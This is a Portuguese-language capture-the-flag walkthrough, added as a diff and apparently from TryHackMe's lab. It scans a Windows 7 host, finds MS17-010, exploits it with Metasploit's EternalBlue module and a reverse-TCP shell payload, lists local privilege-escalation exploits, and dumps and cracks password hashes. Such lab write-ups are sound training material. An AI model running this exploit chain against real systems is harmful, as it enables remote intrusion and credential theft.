@@ -1,0 +1,93 @@
+IP ALVO 10.10.200.74
+
+sudo nmap -sV -p 135,139,445 `cat ip` -Pn
+
+PORT    STATE SERVICE      VERSION
+135/tcp open  msrpc        Microsoft Windows RPC
+139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
+445/tcp open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
+Service Info: Host: JON-PC; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 7.92 seconds
+
+- sudo nmap -sS --script vuln -p 445 `cat ip` -Pn (procurar vulnerabilidade)
+PORT    STATE SERVICE
+445/tcp open  microsoft-ds
+
+Host script results:
+| smb-vuln-ms17-010: 
+|   VULNERABLE:
+|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
+|     State: VULNERABLE
+|     IDs:  CVE:CVE-2017-0143
+|     Risk factor: HIGH
+|       A critical remote code execution vulnerability exists in Microsoft SMBv1
+|        servers (ms17-010).
+|           
+|     Disclosure date: 2017-03-14
+|     References:
+|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
+|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
+|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
+|_smb-vuln-ms10-061: NT_STATUS_ACCESS_DENIED
+|_samba-vuln-cve-2012-1182: NT_STATUS_ACCESS_DENIED
+|_smb-vuln-ms10-054: false
+
+
+pesquisa na internet por exploit ms 
+-encontrado ms17-010
+
+-msfconsole 
+
+-search ms17-010 
+exploit/windows/smb/ms17_010_eternalblue (foi feito o teste atraves do tryhackme mas tambem tem o nome da ctf)
+
+-info -> informacoes do exploit 
+
+-show options -> opcoes da maquina
+
+-set RHOSTS 10.10.200.74
+
+- set LHOST 10.8.87.12
+
+- dica tryhack me :set payload windows/x64/shell/reverse_tcp
+
+- executar o comando exploit
+
+- sysinfo para verificar as informacoes do sistema
+Computer        : JON-PC
+OS              : Windows 7 (6.1 Build 7601, Service Pack 1).
+Architecture    : x64
+System Language : en_US
+Domain          : WORKGROUP
+Logged On Users : 0
+Meterpreter     : x64/windows
+
+-ps -> verifica os processos
+
+-getprivs -> verifica os privilegios 
+
+- run post/multi/recon/local_exploit_suggester -> verifica qual exploit pode ser executado na maquina alvo 
+ #   Name                                                           Potentially Vulnerable?  Check Result
+ -   ----                                                           -----------------------  ------------
+ 1   exploit/windows/local/cve_2019_1458_wizardopium                Yes                      The target appears to be vulnerable.
+ 2   exploit/windows/local/cve_2020_1054_drawiconex_lpe             Yes                      The target appears to be vulnerable.
+ 3   exploit/windows/local/ms10_092_schelevator                     Yes                      The service is running, but could not be validated.
+ 4   exploit/windows/local/ms14_058_track_popup_menu                Yes                      The target appears to be vulnerable.
+ 5   exploit/windows/local/ms15_051_client_copy_image               Yes                      The target appears to be vulnerable.
+ 6   exploit/windows/local/ms16_014_wmi_recv_notif                  Yes                      The target appears to be vulnerable.
+ 7   exploit/windows/local/ms16_075_reflection                      Yes                      The target appears to be vulnerable.
+ 8   exploit/windows/local/ms16_075_reflection_juicy                Yes                      The target appears to be vulnerable.
+ 9   exploit/windows/local/tokenmagic                               Yes                      The target appears to be vulnerable.
+ 
+ 
+ ctrl + z 
+ 
+ use post/windows/gather/hashdump
+
+sudo msfdb init -> cria banco de dados
+
+use auxiliary/analyze/crack_windows
+
+
